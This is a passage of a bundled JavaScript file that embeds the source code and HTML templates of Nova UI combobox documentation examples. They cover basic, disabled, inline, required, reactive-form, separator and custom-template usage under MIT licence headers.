reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport _cloneDeep from "lodash/cloneDeep";\n\nimport { ISelectChangedEvent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-combobox-custom-template-example",\n    templateUrl: "./combobox-custom-template.example.component.html",\n    styleUrls: ["./combobox-custom-template.example.component.less"],\n})\nexport class ComboboxCustomTemplateExampleComponent {\n    public dataset = {\n        displayValue: "value",\n        selectedItem: "",\n        items: [\n            {\n                name: "item_1",\n                value: "Bonobo 112",\n                icon: "severity_ok",\n                progress: 78,\n            },\n            {\n                name: "item_2",\n                value: "Zelda 113",\n                icon: "severity_ok",\n                progress: 66,\n            },\n            {\n                name: "item_3",\n                value: "Max 123",\n                icon: "severity_critical",\n                progress: 7,\n            },\n            {\n                name: "item_4",\n                value: "Apple 234",\n                icon: "severity_ok",\n                progress: 24,\n            },\n            {\n                name: "item_5",\n                value: "Quartz 124",\n                icon: "severity_warning",\n                progress: 89,\n            },\n        ],\n    };\n    public displayedItems = this.dataset.items;\n\n    constructor() {}\n\n    public textboxChanged(searchQuery: ISelectChangedEvent<string>): void {\n        this.displayedItems = _cloneDeep(this.dataset.items);\n        this.displayedItems = this.displayedItems.filter((item: any) =>\n            item.value.includes(searchQuery.newValue)\n        );\n    }\n}\n'},37894:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox\n    [value]="dataset.selectedItem"\n    [isDisabled]="true"\n    [itemsSource]="dataset.items"\n></nui-combobox>\n'},69970:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-combobox-disabled-example",\n    templateUrl: "./combobox-disabled.example.component.html",\n})\nexport class ComboboxDisabledExampleComponent {\n    public dataset = {\n        items: ["Item 1", "Item 2", "Item 3", "Item 4", "Item 5"],\n        selectedItem: "",\n    };\n}\n'},17691:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox\n    [itemsSource]="dataset.items"\n    displayValue="name"\n    (changed)="onValueChange($event)"\n    placeholder="Select item"\n    i18n-placeholder\n></nui-combobox>\n<p class="nui-text-default">You selected: {{ selectedItem | json }}</p>\n'},920:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { ISelectChangedEvent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-combobox-display-value-example",\n    templateUrl: "combobox-display-value.example.component.html",\n})\nexport class ComboboxDisplayValueExampleComponent {\n    public dataset = {\n        items: [\n            { value: "Value 1", name: "Item 1" },\n            { value: "Value 2", name: "Item 2" },\n            { value: "Value 3", name: "Item 3" },\n            { value: "Value 4", name: "Item 4" },\n            { value: "Value 5", name: "Item 5" },\n        ],\n    };\n    public selectedItem: any;\n\n    public onValueChange(changedEvent: ISelectChangedEvent<any>): void {\n        this.selectedItem = changedEvent.newValue;\n    }\n}\n'},12818:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    <code>&lt;nui-combobox&gt;</code> allows user to select one item from a\n    list. User may filter the list by typing a query into the accompanying input\n    field. <strong>Note:</strong> maximum width of combobox dropdown menu is\n    400px (except for stretched combobox, where combobox itself and combobox\n    dropdown menu are justified to the width of container element).\n</p>\n<h2>Accessibility</h2>\n<p>\n    Use <code>Tab</code> to navigate through form controls. Focus in and out\n    with <code>Tab</code> will, respectively, open and close popup.<br />\n    When input focused and popup is closed press\n    <code>shift + arrow down</code> (or just <code>arrow down</code>) to open\n    popup. <br />\n    When opened: <br />\n    <code>Arrow top/bottom</code> - navigate through items in a list; <br />\n    Make an item active with arrows and press <code>Enter</code> to select it;\n    <br />\n    <code>Esc</code> - close popup; <br />\n    When datasource in combobox is changed - key control is reset; <br />\n    If an item was active and then datasource is changed - first item will\n    become active; <br />\n</p>\n<h2>Basic Usage</h2>\n<p>\n    To implement basic combobox you need to pass data via\n    <code>itemsSource</code> input. Use <code>placeholder</code> input to\n    display placeholder. <code>value</code> receives item that will be selected\n    before user starts to communicate with select component.\n    <code>itemsSource</code> data must be an array of strings.\n</p>\n<nui-example-wrapper filenamePrefix="combobox-basic" exampleTitle="Basic usage">\n    <nui-combobox-basic-example></nui-combobox-basic-example>\n</nui-example-wrapper>\n\n<h2>Disabled</h2>\n<p>To disable combobox use <code>isDisabled</code> property.</p>\n<nui-example-wrapper filenamePrefix="combobox-disabled" exampleTitle="Disabled">\n    <nui-combobox-disabled-example></nui-combobox-disabled-example>\n</nui-example-wrapper>\n\n<h2>Required</h2>\n<p>\n    The option <code>isInErrorState</code> is used to set/change conditional\n    "required" validation. To subscribe to <code>changed</code> event you should\n    pass a function, argument of which is\n    <code\n        ><a href="../interfaces/ISelectChangedEvent.html" target="_blank"\n            >ISelectChangedEvent</a\n        ></code\n    >\n    object. The option <code>isInErrorState</code> is used to set/change\n    conditional "required" validation. This is quick way to set combobox as\n    required instead of passing config object into validator. Use it to\n    highlight error if field is set to empty or if user input doesn\'t\n    corresponds to any item in the the source array and you are not interested\n    in specific message. To subscribe to <code>changed</code> event you should\n    pass a function, argument of which is\n    <code\n        ><a href="../interfaces/ISelectChangedEvent.html" target="_blank"\n            >ISelectChangedEvent</a\n        ></code\n    >\n    object.\n</p>\n<nui-example-wrapper filenamePrefix="combobox-required" exampleTitle="Required">\n    <nui-combobox-required-example></nui-combobox-required-example>\n</nui-example-wrapper>\n\n<h2>Inline</h2>\n<p>\n    To make combobox inline you need to use <code>inline</code> property.\n    <strong>Note:</strong> As you see there are no spacings between\n    <code>nui-combobox</code>es in this example because spacings should be\n    handled by users themselves (users should use\n    <code>@nui-space-md</code> spacing if they want to have several comboboxes\n    next to each other).\n</p>\n<nui-example-wrapper filenamePrefix="combobox-inline" exampleTitle="Inline">\n    <nui-combobox-inline-example></nui-combobox-inline-example>\n</nui-example-wrapper>\n\n<h2>Clear on Blur</h2>\n<p>\n    If you want to clear combobox input if it\'s value is not in the source array\n    you need to pass\n    <code>clearOnBlur</code> property.\n</p>\n<nui-example-wrapper\n    filenamePrefix="combobox-clear"\n    exampleTitle="Clear on Blur"\n>\n    <nui-combobox-clear-example></nui-combobox-clear-example>\n</nui-example-wrapper>\n\n<h2>Icon Adjustment</h2>\n<p>\n    To adjust an icon to the combobox use <code>icon</code> property and pass in\n    the name of the icon.\n</p>\n<nui-example-wrapper\n    filenamePrefix="combobox-icon"\n    exampleTitle="Icon Adjustment"\n>\n    <nui-combobox-icon-example></nui-combobox-icon-example>\n</nui-example-wrapper>\n\n<h2>Filling the Parent Width</h2>\n<p>\n    For combobox to fill it\'s parent width you may pass <code>true</code> to the\n    <code>justified</code> property.\n</p>\n<nui-example-wrapper\n    filenamePrefix="combobox-justified"\n    exampleTitle="Filling the Parent Width"\n>\n    <nui-combobox-justified-example></nui-combobox-justified-example>\n</nui-example-wrapper>\n\n<h2>Display value</h2>\n<p>\n    If you want to have <code>itemsSource</code> as an array of object you need\n    to pass <code>displayValue</code>\n    property with name of the item property that will be shown in the dropdown\n    menu.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="combobox-display-value"\n    exampleTitle="Display value"\n>\n    <nui-combobox-display-value-example></nui-combobox-display-value-example>\n</nui-example-wrapper>\n\n<h2>Using With Reactive Forms</h2>\n<p>\n    To use <code>nui-combobox</code> in reactive forms you need to create\n    <code>FormGroup</code> that represents our form model. After that you can\n    bind <code>nui-combobox</code> to this form element using\n    <code>formControlName</code>\n</p>\n<nui-example-wrapper\n    filenamePrefix="combobox-reactive-form"\n    exampleTitle="Using With Reactive Forms"\n>\n    <nui-combobox-reactive-form></nui-combobox-reactive-form>\n</nui-example-wrapper>\n\n<h2>Typeahead</h2>\n<p>\n    To add typeahead-like behavior to combobox you need to change\n    <code>itemsSource</code> in select in subscription to\n    <code>(changed)</code> event. Then combobox dropdown will be re-rendered\n    with new set of items.\n</p>\n<nui-example-wrapper\n    filenamePrefix="combobox-typeahead"\n    exampleTitle="Typeahead"\n>\n    <nui-combobox-typeahead-example></nui-combobox-typeahead-example>\n</nui-example-wrapper>\n\n<h2>Separators</h2>\n<p>\n    If you want to have grouped data, you need to pass data as an array of\n    <code\n        ><a href="../interfaces/ISelectGroup.html" target="_blank"\n            >ISelectGroup</a\n        ></code\n    >.\n</p>\n<nui-example-wrapper\n    filenamePrefix="combobox-separators"\n    exampleTitle="Separators"\n>\n    <nui-combobox-separators-example></nui-combobox-separators-example>\n</nui-example-wrapper>\n\n<h2>Using a Custom Template</h2>\n<p>\n    To provide custom template for every item in combobox you need to link\n    <code>customTemplate</code> input with <code>TemplateRef</code> that\n    represents custom template.\n</p>\n<nui-example-wrapper\n    filenamePrefix="combobox-custom-template"\n    exampleTitle="Combobox with custom template"\n>\n    <nui-combobox-custom-template-example></nui-combobox-custom-template-example>\n</nui-example-wrapper>\n\n<h2>Append to Body</h2>\n<p>\n    To attach menu popup to &lt;body&gt; use <code>appendToBody</code> input. It\n    allows menu to ignore containers and overlap them.\n</p>\n<nui-example-wrapper\n    filenamePrefix="combobox-append-to-body"\n    exampleTitle="Append to Body"\n>\n    <nui-combobox-append-to-body-example></nui-combobox-append-to-body-example>\n</nui-example-wrapper>\n\n<h2>Using with X button for removing value</h2>\n<p>\n    To enable "X" button for removing combobox value, use\n    <code>isRemoveValueEnabled</code> input set to <code>true</code>. The button\n    will be shown in case value is typed.\n</p>\n<nui-example-wrapper\n    filenamePrefix="combobox-with-remove-value"\n    exampleTitle="Remove value button"\n>\n    <nui-combobox-with-remove-value-example></nui-combobox-with-remove-value-example>\n</nui-example-wrapper>\n'},99598:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-combobox-docs-example",\n    templateUrl: "./combobox-docs.example.component.html",\n})\nexport class ComboboxDocsComponent {}\n'},98806:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox\n    [value]="dataset.selectedItem"\n    icon="add"\n    [itemsSource]="dataset.items"\n    (changed)="valueChange($event)"\n></nui-combobox>\n'},20130:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { ISelectChangedEvent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-combobox-icon-example",\n    templateUrl: "./combobox-icon.example.component.html",\n})\nexport class ComboboxIconExampleComponent {\n    public dataset = {\n        items: ["Item 1", "Item 2", "Item 3", "Item 4", "Item 5"],\n        selectedItem: "Item 1",\n    };\n\n    public valueChange(changedEvent: ISelectChangedEvent<string>): void {\n        this.dataset.selectedItem = changedEvent.newValue;\n    }\n}\n'},76038:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p i18n class="nui-text-default">\n    Lorem ipsum dolor sit amet.\n    <nui-combobox\n        [itemsSource]="dataset.itemsSource1"\n        [inline]="true"\n        i18n-placeholder\n        placeholder="Select item"\n    ></nui-combobox>\n    <nui-combobox\n        [itemsSource]="dataset.itemsSource2"\n        [inline]="true"\n        i18n-placeholder\n        placeholder="Select item"\n    ></nui-combobox>\n    Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut\n    aliquip ex ea commodo consequat.\n</p>\n'},46258:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-combobox-inline-example",\n    templateUrl: "combobox-inline.example.component.html",\n})\nexport class ComboboxInlineExampleComponent {\n    public dataset = {\n        itemsSource1: ["Item 1", "Item 2", "Item 3", "Item 4", "Item 5"],\n        itemsSource2: ["Item 6", "Item 7", "Item 8", "Item 9", "Item 10"],\n    };\n}\n'},40086:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox\n    [itemsSource]="dataset.items"\n    placeholder="Select item"\n    i18n-placeholder\n    [justified]="true"\n></nui-combobox>\n'},67874:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-combobox-justified-example",\n    templateUrl: "./combobox-justified.example.component.html",\n})\nexport class ComboboxJustifiedExampleComponent {\n    public dataset = {\n        items: ["Item 1", "Item 2", "Item 3", "Item 4", "Item 5"],\n    };\n}\n'},89068:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<form [formGroup]="myForm" (submit)="onSubmit()">\n    <div class="form-group">\n        <nui-combobox\n            formControlName="item"\n            [isInErrorState]="\n                myForm.controls[\'item\'].invalid &&\n                myForm.controls[\'item\'].touched\n            "\n            [itemsSource]="dataset.items"\n            placeholder="Select item"\n            i18n-placeholder\n            required\n        ></nui-combobox>\n        <button nui-button type="submit" class="mt-1" i18n>Submit</button>\n    </div>\n</form>\n'},27068:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, OnDestroy, OnInit } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\nimport { Subject } from "rxjs";\nimport { takeUntil } from "rxjs/operators";\n\nimport { ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-combobox-reactive-form",\n    templateUrl: "./combobox-reactive-form.example.component.html",\n})\nexport class ComboboxReactiveFormExampleComponent implements OnInit, OnDestroy {\n    public dataset = {\n        items: ["Item 1", "Item 2", "Item 3", "Item 4", "Item 5"],\n        selectedItem: "Item 2",\n    };\n    public myForm;\n    destroy$$ = new Subject<void>();\n\n    constructor(\n        private formBuilder: FormBuilder,\n        @Inject(ToastService) private toastService: ToastService\n    ) {\n        this.myForm = this.formBuilder.group({\n            item: this.formBuilder.control(this.dataset.selectedItem, [\n                Validators.required,\n            ]),\n        });\n    }\n\n    public ngOnInit(): void {\n        this.myForm.controls.item.valueChanges\n            .pipe(takeUntil(this.destroy$$))\n            .subscribe((value) => console.log(value));\n    }\n\n    public ngOnDestroy(): void {\n        this.destroy$$.next();\n        this.destroy$$.complete();\n    }\n\n    public onSubmit(): void {\n        this.myForm.valid\n            ? this.toastService.success({ message: "Your form is valid!" })\n            : this.toastService.error({ message: `Your form is invalid!` });\n    }\n}\n'},46350:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox\n    [value]="dataset.selectedItem"\n    [isInErrorState]="errorState"\n    [itemsSource]="dataset.items"\n    (changed)="valueChange($event)"\n></nui-combobox>\n'},3562:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnInit } from "@angular/core";\n\nimport { ISelectChangedEvent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-combobox-required-example",\n    templateUrl: "./combobox-required.example.component.html",\n})\nexport class ComboboxRequiredExampleComponent implements OnInit {\n    public isRequired: boolean = true;\n    public errorState: boolean = true;\n    public dataset = {\n        items: ["Item 1", "Item 2", "Item 3", "Item 4", "Item 5"],\n        selectedItem: "",\n    };\n\n    public ngOnInit(): void {\n        this.isInErrorState();\n    }\n\n    public valueChange(changedEvent: ISelectChangedEvent<string>): void {\n        this.dataset.selectedItem = changedEvent.newValue;\n        this.isInErrorState();\n    }\n\n    public isInErrorState(): void {\n        this.errorState =\n            this.isRequired &&\n            (!this.dataset.selectedItem ||\n                !(\n                    this.dataset.items.indexOf(this.dataset.selectedItem) !== -1\n                ));\n    }\n}\n'},33946:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox\n    [itemsSource]="displayedItems"\n    (changed)="textboxChanged($event)"\n    placeholder="Select item"\n    i18n-placeholder\n></nui-combobox>\n'},19302:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport _cloneDeep from "lodash/cloneDeep";\n\nimport { ISelectChangedEvent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-combobox-separators-example",\n    templateUrl: "./combobox-separators.example.component.html",\n})\nexport class ComboboxSeparatorsExampleComponent {\n    public dataset = {\n        itemsInGroups: [\n            {\n                header: `Group 1 header`,\n                items: [`Item 111`, `Item 211`, `Item 311`],\n            },\n            {\n                header: `Group 2 header`,\n                items: [`Item 112`, `Item 212`, `Item 312`],\n            },\n            {\n                header: `Group 3 header`,\n                items: [`Item 113`, `Item 213`, `Item 313`],\n            },\n        ],\n    };\n    public displayedItems = this.dataset.itemsInGroups;\n\n    constructor() {}\n\n    public textboxChanged(searchQuery: ISelectChangedEvent<string>): void {\n        this.displayedItems = _cloneDeep(this.dataset.itemsInGroups);\n        this.displayedItems.forEach((items) => {\n            items.items = items.items.filter((item) =>\n                item.includes(searchQuery.newValue)\n            );\n        });\n    }\n}\n'},4618:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h1>Basic</h1>\n<nui-combobox\n    id="nui-demo-basic-combobox"\n    [itemsSource]="dataset"\n    placeholder="Select item"\n></nui-combobox>\n<hr />\n<h1>Clear On Blur</h1>\n<nui-combobox\n    id="nui-demo-combobox-with-clear-on-blur"\n    [itemsSource]="dataset"\n    [clearOnBlur]="true"\n    placeholder="Select Item"\n></nui-combobox>\n<hr />\n<h1>Disabled</h1>\n<nui-combobox\n    id="nui-demo-combobox-disabled"\n    value="Item 1"\n    [isDisabled]="true"\n    [itemsSource]="dataset"\n></nui-combobox>\n<hr />\n<h1>Display Value</h1>\n<nui-combobox\n    id="nui-demo-display-value-combobox"\n    [itemsSource]="displayValueDataset"\n    displayValue="name"\n    (changed)="onDisplayValueChange($event)"\n    placeholder="Select item"\n></nui-combobox>\n<p>You selected: {{ displayValueSelectedItem | json }}</p>\n<hr />\n<h1>With Icon</h1>\n<nui-combobox\n    id="nui-demo-combobox-with-icon"\n    value="Item 1"\n    icon="add"\n    [itemsSource]="dataset"\n></nui-combobox>\n<hr />\n<h1>Inline</h1>\n<nui-combobox\n    id="nui-demo-inline-combobox"\n    [itemsSource]="dataset"\n    [inline]="true"\n    placeholder="Select item"\n></nui-combobox>\n<hr />\n<h1>Reactive Form</h1>\n<form [formGroup]="myForm" (submit)="onSubmit()">\n    <div class="form-group">\n        <nui-combobox\n            id="nui-demo-combobox-reactive-form"\n            formControlName="item"\n            [isInErrorState]="\n                myForm.controls[\'item\'].invalid &&\n                myForm.controls[\'item\'].touched\n            "\n            [itemsSource]="dataset"\n            placeholder="Select item"\n            required\n        ></nui-combobox>\n        <button nui-button type="submit" class="mt-1">Submit</button>\n    </div>\n</form>\n<hr 